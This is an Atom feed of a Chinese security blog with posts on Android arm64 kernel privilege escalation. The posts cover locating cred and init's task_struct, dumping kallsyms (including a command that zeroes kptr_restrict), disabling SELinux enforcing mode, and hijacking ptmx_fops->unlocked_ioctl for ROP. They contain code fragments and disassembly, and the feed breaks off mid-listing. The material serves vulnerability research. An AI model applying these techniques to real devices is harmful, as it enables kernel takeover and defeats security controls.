<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[idhyt's blog]]></title>
  <subtitle><![CDATA[云淡风轻]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://blog.idhyt.com/"/>
  <updated>2016-06-08T18:21:53.000Z</updated>
  <id>http://blog.idhyt.com/</id>
  
  <author>
    <name><![CDATA[idhyt]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[进程描述符]]></title>
    <link href="http://blog.idhyt.com/2016/06/09/exploit-process-descriptor/"/>
    <id>http://blog.idhyt.com/2016/06/09/exploit-process-descriptor/</id>
    <published>2016-06-08T17:46:11.000Z</published>
    <updated>2016-06-08T18:21:53.000Z</updated>
    <content type="html"><![CDATA[<p>漏洞利用的核心都是通过修改task_struct中的一些字段来达到任意地址读写和提权操作的。<br><a id="more"></a></p>
<p>进程描述符task_struct数据结构包含了与一个进程相关的所有信息，在<code>kernel/include/linux/sched.h</code>中定义，其中有很多字段是通过预定义形式来定义填充在结构体中，所以在每个系统版本中其数据结构也会不同。</p>
<p>把task_struct中的数据全部打印出来，会看到很多有趣的东西，这些特征可以用来定位重要的结构。</p>
<h2 id="定位cred">定位cred</h2><p>漏洞提权过程中修改的cred.security信息，需要先定位到cred。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x4d0</span> = <span class="number">0xffffffc0461ce4d0</span>: <span class="number">0xffffffc0461ce4d0</span>    <span class="comment">// cpu_timers[0]</span></span><br><span class="line">+<span class="number">0x4d8</span> = <span class="number">0xffffffc0461ce4d8</span>: <span class="number">0xffffffc0461ce4d0</span></span><br><span class="line">+<span class="number">0x4e0</span> = <span class="number">0xffffffc0461ce4e0</span>: <span class="number">0xffffffc0461ce4e0</span>    <span class="comment">// cpu_timers[1]</span></span><br><span class="line">+<span class="number">0x4e8</span> = <span class="number">0xffffffc0461ce4e8</span>: <span class="number">0xffffffc0461ce4e0</span></span><br><span class="line">+<span class="number">0x4f0</span> = <span class="number">0xffffffc0461ce4f0</span>: <span class="number">0xffffffc0461ce4f0</span>    <span class="comment">// cpu_timers[2]</span></span><br><span class="line">+<span class="number">0x4f8</span> = <span class="number">0xffffffc0461ce4f8</span>: <span class="number">0xffffffc0461ce4f0</span></span><br><span class="line">+<span class="number">0x500</span> = <span class="number">0xffffffc0461ce500</span>: <span class="number">0xffffffc0101f4900</span>    <span class="comment">// real_cred </span></span><br><span class="line">+<span class="number">0x508</span> = <span class="number">0xffffffc0461ce508</span>: <span class="number">0xffffffc0101f4900</span>    <span class="comment">// cred </span></span><br><span class="line">+<span class="number">0x510</span> = <span class="number">0xffffffc0461ce510</span>: <span class="number">0x363130322d657663</span>    <span class="comment">// char comm[TASK_COMM_LEN]</span></span><br><span class="line">+<span class="number">0x518</span> = <span class="number">0xffffffc0461ce518</span>: <span class="number">0x652d333534322d</span></span><br></pre></td></tr></table></figure>
<p>通过cpu_timers的特征就有了通用的定位方法，也是所有提权代码中都用到的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (task-&gt;cpu_timers[<span class="number">0</span>].next == task-&gt;cpu_timers[<span class="number">0</span>].prev &amp;&amp;</span><br><span class="line">    task-&gt;cpu_timers[<span class="number">1</span>].next == task-&gt;cpu_timers[<span class="number">1</span>].prev &amp;&amp;</span><br><span class="line">    task-&gt;cpu_timers[<span class="number">2</span>].next == task-&gt;cpu_timers[<span class="number">2</span>].prev &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cpu_timers[<span class="number">0</span>].next &gt; KERNEL_START &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cpu_timers[<span class="number">1</span>].next &gt; KERNEL_START &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cpu_timers[<span class="number">2</span>].next &gt; KERNEL_START &amp;&amp;</span><br><span class="line">    task-&gt;real_cred == task-&gt;cred &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)task-&gt;cred &gt; KERNEL_START) &#123;</span><br><span class="line">    <span class="comment">// do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>comm[TASK_COMM_LEN]</code>字段是进程名，也可以通过这个特征来找到cred，找到进程名的地址，然后减8(x64)就是cred的地址了。</p>
<h2 id="遍历进程tasks">遍历进程tasks</h2><p>task_struct结构中定义了一个list_head类型的tasks。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">task_struct &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">struct</span> list_head tasks;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    <span class="keyword">struct</span> plist_node pushable_tasks;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> list_head</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> list_head *next;</span><br><span class="line">    <span class="keyword">struct</span> list_head *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>list_head为一个双向链表，可以遍历到所有进程的tasks结构。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-process-descriptor-01.png" alt=""></p>
<p>如何定位到tasks地址?</p>
<p>tasks下边有个预定义变量pushable_tasks，在多核手机总是存在的，第一个值为优先级prio，打印出来，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x290</span> = <span class="number">0xffffffc0461ce290</span>: <span class="number">0xffffffc000ee05e0</span>    <span class="comment">// struct list_head tasks</span></span><br><span class="line">+<span class="number">0x298</span> = <span class="number">0xffffffc0461ce298</span>: <span class="number">0xffffffc0a98b2290</span></span><br><span class="line">+<span class="number">0x2a0</span> = <span class="number">0xffffffc0461ce2a0</span>: <span class="number">0x8c</span>    <span class="comment">// pushable_tasks.prio</span></span><br><span class="line">+<span class="number">0x2a8</span> = <span class="number">0xffffffc0461ce2a8</span>: <span class="number">0xffffffc0461ce2a8</span></span><br><span class="line">+<span class="number">0x2b0</span> = <span class="number">0xffffffc0461ce2b0</span>: <span class="number">0xffffffc0461ce2a8</span></span><br></pre></td></tr></table></figure>
<p>在我目前所看到的值都为0x8c，因此可以通过该值来定位tasks地址。</p>
<h2 id="bypass_selinux">bypass selinux</h2><p>在不考虑selinux保护的时候，提权只需要简单的将security.osid和security.sid置1，这样得到的只是kernel权限，并不是真正的init最高权限。<br>内核中u:r:kernel:s0始终为1，而u:r:init:s0是变化的，每个内核不同。<br>因此要获取该值就要先找到init进程的task_struct。</p>
<p>如何定位init进程?</p>
<h3 id="内核符号表导出">内核符号表导出</h3><p>在<code>/arch/arm/kernel/init_task.c</code>中定义有</p>
<pre><code>struct task_struct init_task = INIT_TASK<span class="list">(<span class="keyword">init_task</span>)</span><span class="comment">;</span>
</code></pre><p>有些内核会在内核符号表kallsyms中导出init_task地址。</p>
<h3 id="遍历内核tasks">遍历内核tasks</h3><p>在漏洞利用提权过程中，获取的当前进程的task_struct，就能拿到tasks地址，然后遍历所有进程的tasks，通过comm判断是否为init进程。</p>
<h3 id="暴力搜索">暴力搜索</h3><p>在task_struct结构中有个几个字段定义了进程的一些特性，其中kernel thread的一些特征值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> task_struct &#123;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">long</span> state; <span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="built_in">stack</span>; <span class="comment">// 2-page (8K) aligned address,栈指针，指向当前thread_info结构。</span></span><br><span class="line">    <span class="keyword">atomic_t</span> usage; <span class="comment">// 0x2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags; <span class="comment">// 0x200000, I am a kernel thread</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>搜索范围可以通过<code>/proc/iomem</code>中的kernel data字段获取，通过这些特征值就可以找到内核进程swapper/0的task_struct结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (pos = begin; pos &lt; end; pos += <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( task_struct_buf.<span class="built_in">stack</span> &amp; <span class="number">0x1ff</span> == <span class="number">0</span> &amp;&amp; </span><br><span class="line">         task_struct_buf.usage == <span class="number">0x2</span> &amp;&amp; </span><br><span class="line">         task_struct_buf.flags == <span class="number">0x200000</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\tfound swapper/0 task_struct_address: %lp\n"</span>, pos);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后找到tasks依次遍历内核进程定位init进程。</p>
<h2 id="父进程">父进程</h2><p>task_struct中通过<code>struct task_struct __rcu *real_parent</code>定义了该进程的父进程，通过如下方法可以将父进程改为init进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// do something...</span></span><br><span class="line">        <span class="comment">// my parent is init...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// waitpid(pid, NULL, 0);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以也可以通过这种方法获取init进程的task_struct，至于其他的用处，对方不想说话并向你扔了一头猪。。。</p>
<h2 id="内核栈">内核栈</h2><p>task_struct中<code>void *stack</code>指向当前进程的内核栈，进程通过alloc_thread_info函数分配它的内核栈，通过free_thread_info函数释放所分配的内核栈。</p>
<p>Linux内核通过thread_union联合体来表示进程的内核栈，其中THREAD_SIZE宏的大小为8192。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union &#123;  </span><br><span class="line">    <span class="keyword">struct</span> thread_info thread_info;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当进程从用户态切换到内核态时，进程的内核栈总是空的，所以ARM的sp寄存器指向这个栈的顶端。因此，内核能够轻易地通过sp寄存器获得当前正在CPU上运行的进程。<br>由于堆栈是向下增长的，esp和thread_info位于同一个8KB或者4KB的块当中，也就是thread_union的长度了。<br>如果是8KB，屏蔽esp的低13位就可以得到thread_info的地址，也就是8KB块的开始位置。4KB的话，就屏蔽低12位。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> thread_info *<span class="title">current_thread_info</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> sp <span class="title">asm</span> <span class="params">(<span class="string">"sp"</span>)</span></span>;</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">struct</span> thread_info *)(sp &amp; ~(THREAD_SIZE - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>汇编:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov R2, <span class="preprocessor">#<span class="number">0xffffe000</span></span></span><br><span class="line">and R3, R2, esp  </span><br><span class="line"></span><br><span class="line">或 </span><br><span class="line"></span><br><span class="line">BIC R3, R2, <span class="preprocessor">#<span class="number">0x1FC0</span></span></span><br><span class="line">BIC R3, R3, <span class="preprocessor">#<span class="number">0x3F</span></span></span><br></pre></td></tr></table></figure>
<p>thread_info结构中也有很多重要的字段，如进程描述符task，获取任意地址读写能力的addr_limit等。</p>
<h2 id="待续">待续</h2><p>待更…</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>漏洞利用的核心都是通过修改task_struct中的一些字段来达到任意地址读写和提权操作的。<br>]]>
    
    </summary>
    
      <category term="task" scheme="http://blog.idhyt.com/tags/task/"/>
    
      <category term="thread" scheme="http://blog.idhyt.com/tags/thread/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何优雅的使用内核符号表]]></title>
    <link href="http://blog.idhyt.com/2016/05/09/exploit-kernel-symbol-usage/"/>
    <id>http://blog.idhyt.com/2016/05/09/exploit-kernel-symbol-usage/</id>
    <published>2016-05-09T15:31:24.000Z</published>
    <updated>2016-06-22T15:48:14.000Z</updated>
    <content type="html"><![CDATA[<p>主要针对arm64，现在ida6.8并不支持arm64的反汇编，所以在定位代码过程中会很麻烦，而32位是直接可以f5对照源码看的。</p>
<h2 id="获取内核符号表">获取内核符号表</h2><p>先放一个内核符号表的部分样子：</p>
<pre><code>ffffffc<span class="number">000081000</span> do_undefinstr
ffffffc<span class="number">000081000</span> _stext
ffffffc<span class="number">000081000</span> __exception_text_start
ffffffc<span class="number">000081348</span> do_mem_abort
ffffffc<span class="number">0000813e4</span> do_sp_pc_abort
ffffffc<span class="number">000081428</span> do_debug_exception
ffffffc<span class="number">0000814d4</span> gic_handle_irq
ffffffc<span class="number">000081554</span> gic_handle_irq
ffffffc<span class="number">0000815d4</span> __exception_text_end
ffffffc<span class="number">0000815d8</span> match_dev_by_uuid
ffffffc<span class="number">000081618</span> name_to_dev_t
ffffffc<span class="number">000082000</span> swp_handler.part.1
ffffffc<span class="number">000082138</span> swp_handler
ffffffc<span class="number">0000821</span>fc clear_os_lock
ffffffc<span class="number">000082208</span> create_debug_debugfs_entry
ffffffc<span class="number">000082238</span> brk_handler.part.2
ffffffc<span class="number">0000822a0</span> brk_handler
ffffffc<span class="number">00008238</span>c single_step_handler.part.3
ffffffc<span class="number">0000823f8</span> single_step_handler
ffffffc<span class="number">0000824f8</span> debug_monitors_arch
ffffffc<span class="number">000082504</span> enable_debug_monitors
ffffffc<span class="number">000082620</span> disable_debug_monitors
ffffffc<span class="number">00008270</span>c register_step_hook
ffffffc<span class="number">000082764</span> unregister_step_hook
ffffffc<span class="number">0000827c4</span> register_break_hook 
...
</code></pre><h3 id="有root权限">有root权限</h3><p>两条命令即可：</p>
<pre><code>adb shell, echo <span class="number">0</span> &gt; /<span class="keyword">proc</span>/sys/kernel/kptr_restrict sysctl 
adb pull /<span class="keyword">proc</span>/kallsyms kallsyms.txt
</code></pre><h3 id="无root权限">无root权限</h3><p>1.获取kernel文件，解压rom包找到boot.img文件，然后<a href="https://github.com/idhyt/exploit_tools/blob/master/bootimg.py" target="_blank" rel="external">bootimg</a>提取kernel压缩文件，直接解压获取kernel文件。如果解压失败，用二进制文件打开，查找特征值<code>1F 8B 08</code>，删除之前数据保存并解压。</p>
<p>2.使用<a href="https://github.com/idhyt/exploit_tools/tree/master/kallsymsprint-master" target="_blank" rel="external">kallsymsprint</a>获取，参数为kernel文件路径。</p>
<p>3.懒人的方法，打包一个脚本<a href="https://github.com/idhyt/dump_kallsyms" target="_blank" rel="external">dump_kallsyms</a>搞定 : )</p>
<h2 id="patch_selinux_mode">patch selinux mode</h2><p>内核提权过程中，完成了addr_limit字段的patch之后，那么用户态就可以任意读写内核态了，但是如果系统的selinux使用的是enforcing模式，后续的提权过程需要pacth selinux mode。</p>
<p>源码中<code>#define selinux_enforcing 1</code>，该模式为<code>enforcing</code>，获得任意读写能力之后将其置0即可改为<code>permissive</code>。</p>
<p>查找内核符号表，变量selinux_enforcing并没有导出地址(部分会有)，查找源码找到使用该值的地方，例如在<code>enforcing_setup</code>函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">enforcing_setup</span><span class="params">(<span class="keyword">char</span> *str)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> enforcing;</span><br><span class="line">    <span class="keyword">if</span> (!kstrtoul(str, <span class="number">0</span>, &amp;enforcing))</span><br><span class="line">        selinux_enforcing = enforcing ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在内核符号表中找到函数enforcing_setup的地址为<code>0xffffffc000d75878</code>，反汇编该地址处的代码。<br>ida无法反汇编arm64，可以通过python的<code>capstone</code>模块进行反汇编，用法可<a href="https://github.com/idhyt/magic_lamp/blob/master/hex-code-disasm.py" target="_blank" rel="external">参考</a>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d75878</span>:     stp     x29, x30, [sp, <span class="preprocessor">#-<span class="number">0x20</span>]!</span></span><br><span class="line"><span class="number">0xffffffc000d7587c</span>:     movz    w1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d75880</span>:     mov     x29, sp</span><br><span class="line"><span class="number">0xffffffc000d75884</span>:     add     x2, x29, <span class="preprocessor">#<span class="number">0x18</span></span></span><br><span class="line"><span class="number">0xffffffc000d75888</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc000324c88</span></span></span><br><span class="line"><span class="number">0xffffffc000d7588c</span>:     cbnz    w0, <span class="preprocessor">#<span class="number">0xffffffc000d758a4</span></span></span><br><span class="line"><span class="number">0xffffffc000d75890</span>:     ldr     x0, [x29, <span class="preprocessor">#<span class="number">0x18</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d75894</span>:     cmp     x0, xzr</span><br><span class="line"><span class="number">0xffffffc000d75898</span>:     adrp    x0, <span class="preprocessor">#<span class="number">0xffffffc000f2f000</span></span></span><br><span class="line"><span class="number">0xffffffc000d7589c</span>:     cset    w1, ne</span><br><span class="line"><span class="number">0xffffffc000d758a0</span>:     str     w1, [x0, <span class="preprocessor">#<span class="number">0xc0c</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d758a4</span>:     movz    w0, <span class="preprocessor">#<span class="number">0x1</span></span></span><br><span class="line"><span class="number">0xffffffc000d758a8</span>:     ldp     x29, x30, [sp], <span class="preprocessor">#<span class="number">0x20</span></span></span><br><span class="line"><span class="number">0xffffffc000d758ac</span>:     ret</span><br></pre></td></tr></table></figure>
<p>enforcing_setup = 0xffffffc000f2f000 + 0xc0c</p>
<h2 id="patch_ioctl">patch ioctl</h2><p>在linux内核PXN开启且代码段只读开启的前提下，如果获得了任意地址写的能力,怎么提权呢，ret2user是不行了，安装一个syscall调用commit_creds也不行了，sys_call_table也是不能改的(引自网络)。一种思路是通过改写<code>ptmx_fops-&gt;unlocked_ioctl</code>指向rop，然后调用<code>/dev/ptmx</code>的ioctl即可跳入rop中执行。</p>
<p>同样ptmx_fops在内核符号表中是没有导出的，如何确定该地址并修改unlocked_ioctl的指针。</p>
<p>查看源码ptmx_fops使用的地方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">pty_init</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    legacy_pty_init();</span><br><span class="line">    unix98_pty_init();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function">init <span class="title">unix98_pty_init</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Now create the /dev/ptmx special device */</span></span><br><span class="line">    tty_default_fops(&amp;ptmx_fops);</span><br><span class="line">    ptmx_fops.open = ptmx_open;</span><br><span class="line"></span><br><span class="line">    cdev_init(&amp;ptmx_cdev, &amp;ptmx_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;ptmx_cdev, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>) ||</span><br><span class="line">        register_chrdev_region(MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>, <span class="string">"/dev/ptmx"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">"Couldn't register /dev/ptmx driver"</span>);</span><br><span class="line">    device_create(tty_class, <span class="literal">NULL</span>, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="literal">NULL</span>, <span class="string">"ptmx"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tty_default_fops</span><span class="params">(<span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    *fops = tty_fops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在ptmx设备初始化时<code>tty_default_fops</code>会将指针tty_fops赋值给ptmx_fops，调用ptmx_fops的时候会通过tty_fops指针调相应的函数，其tty_fops定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">struct</span> file_operations tty_fops = &#123;</span><br><span class="line">    .llseek     = no_llseek,</span><br><span class="line">    .read       = tty_read,</span><br><span class="line">    .write      = tty_write,</span><br><span class="line">    .poll       = tty_poll,</span><br><span class="line">    .unlocked_ioctl = tty_ioctl,</span><br><span class="line">    .compat_ioctl   = tty_compat_ioctl,</span><br><span class="line">    .open       = tty_open,</span><br><span class="line">    .release    = tty_release,</span><br><span class="line">    .fasync     = tty_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最后会通过fops-&gt;unlocked_ioctl调用tty_ioctl.</p>
<p>unix98_pty_init函数为inline类型，编译器编译时候会直接内联到调用函数中，所以从内核符号表中找到pty_init函数地址为<code>0xffffffc000d78e80</code>，然后进行反汇编：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d78e80</span>:     stp     x29, x30, [sp, <span class="preprocessor">#-<span class="number">0x70</span>]!</span></span><br><span class="line"><span class="number">0xffffffc000d78e84</span>:     mov     x29, sp</span><br><span class="line"><span class="number">0xffffffc000d78e88</span>:     stp     x19, x20, [sp, <span class="preprocessor">#<span class="number">0x10</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e8c</span>:     adrp    x20, <span class="preprocessor">#<span class="number">0xffffffc000df5000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78e90</span>:     stp     x23, x24, [sp, <span class="preprocessor">#<span class="number">0x30</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e94</span>:     stp     x21, x22, [sp, <span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e98</span>:     ldr     w0, [x20, <span class="preprocessor">#<span class="number">0xef0</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e9c</span>:     adrp    x23, <span class="preprocessor">#<span class="number">0xffffffc000df5000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ea0</span>:     stp     x25, x26, [sp, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78ea4</span>:     stp     x27, x28, [sp, <span class="preprocessor">#<span class="number">0x50</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78ea8</span>:     cmp     w0, wzr</span><br><span class="line"><span class="number">0xffffffc000d78eac</span>:     adrp    x25, <span class="preprocessor">#<span class="number">0xffffffc000c1e000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78eb0</span>:     adrp    x22, <span class="preprocessor">#<span class="number">0xffffffc000a35000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78eb4</span>:     adrp    x24, <span class="preprocessor">#<span class="number">0xffffffc000c1e000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78eb8</span>:     b.le    <span class="preprocessor">#<span class="number">0xffffffc000d79014</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ebc</span>:     movz    x1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ec0</span>:     movz    x2, <span class="preprocessor">#<span class="number">0x46</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ec4</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0003413d0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ec8</span>:     cmn     x0, <span class="preprocessor">#<span class="number">1</span>, lsl #<span class="number">12</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ecc</span>:     mov     x19, x0</span><br><span class="line"><span class="number">0xffffffc000d78ed0</span>:     b.ls    <span class="preprocessor">#<span class="number">0xffffffc000d78ee0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ed4</span>:     adrp    x0, <span class="preprocessor">#<span 